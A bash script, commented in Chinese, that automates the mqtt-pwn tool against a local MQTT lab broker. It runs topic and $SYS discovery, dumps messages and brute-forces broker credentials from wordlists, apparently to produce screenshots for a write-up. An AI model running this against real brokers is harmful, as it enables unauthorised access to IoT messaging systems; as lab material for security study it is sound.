#!/usr/bin/env bash
# 用 mqtt-pwn 对本地靶场做 discovery + bruteforce（非交互，方便截图/写文）
# 依赖：/tmp/mqtt-pwn 已装好 venv，docker postgres 在 5431
set -euo pipefail

HOST="${MQTT_HOST:-192.168.2.127}"
PORT="${MQTT_PORT:-1883}"
ROOT_LAB="$(cd "$(dirname "$0")/.." && pwd)"
PWN_ROOT="${MQTTPWN_ROOT:-/tmp/mqtt-pwn}"
UF="${1:-$ROOT_LAB/wordlists/usernames.txt}"
PF="${2:-$ROOT_LAB/wordlists/passwords.txt}"
MODE="${3:-all}"   # all | discovery | brute

if [[ ! -x "$PWN_ROOT/.venv/bin/python" ]]; then
  echo "[!] 找不到 $PWN_ROOT/.venv。先准备 mqtt-pwn："
  echo "    cd $PWN_ROOT && python3 -m venv .venv && .venv/bin/pip install -r requirements.txt 'setuptools<81'"
  exit 1
fi

export MQTTPWN_BASE_PATH="${MQTTPWN_BASE_PATH:-$PWN_ROOT/}"
export MQTTPWN_DB_HOST="${MQTTPWN_DB_HOST:-127.0.0.1}"
export MQTTPWN_DB_PORT="${MQTTPWN_DB_PORT:-5431}"
export TERM="${TERM:-xterm-256color}"
export PYTHONPATH="$PWN_ROOT${PYTHONPATH:+:$PYTHONPATH}"

cd "$PWN_ROOT"
if ! docker compose ps --status running 2>/dev/null | grep -q db; then
  echo "[*] 启动 mqtt-pwn Postgres..."
  docker compose up -d db
  for i in $(seq 1 30); do
    docker compose exec -T db pg_isready -U postgres -d mqttpwn >/dev/null 2>&1 && break
    sleep 1
  done
fi

run_pwn() {
  timeout "${TIMEOUT:-90}" "$PWN_ROOT/.venv/bin/python" "$PWN_ROOT/run.py" 2>&1
}

case "$MODE" in
  discovery)
    {
      echo "connect -o $HOST -p $PORT"
      echo "system_info"
      echo "discovery -t 8 -p # \$SYS/#"
      echo "shell sleep 10"
      echo "scans"
      echo "topics"
      echo "messages"
      echo "quit"
    } | run_pwn
    ;;
  brute)
    {
      echo "connect -o $HOST -p $PORT -u lab -w lab"
      echo "bruteforce --host $HOST -uf $UF -pf $PF"
      echo "quit"
    } | TIMEOUT=120 run_pwn
    ;;
  all)
    echo "======== mqtt-pwn discovery @ $HOST:$PORT ========"
    {
      echo "connect -o $HOST -p $PORT"
      echo "system_info"
      echo "discovery -t 8 -p # \$SYS/#"
      echo "shell sleep 10"
      echo "scans"
      echo "topics"
      echo "messages"
      echo "quit"
    } | run_pwn
    echo
    echo "======== mqtt-pwn bruteforce (请先切 02-auth-weak) ========"
    {
      echo "connect -o $HOST -p $PORT -u lab -w lab"
      echo "bruteforce --host $HOST -uf $UF -pf $PF"
      echo "quit"
    } | TIMEOUT=120 run_pwn
    ;;
  *)
    echo "用法: $0 [usernames.txt] [passwords.txt] [all|discovery|brute]"
    exit 1
    ;;
esac
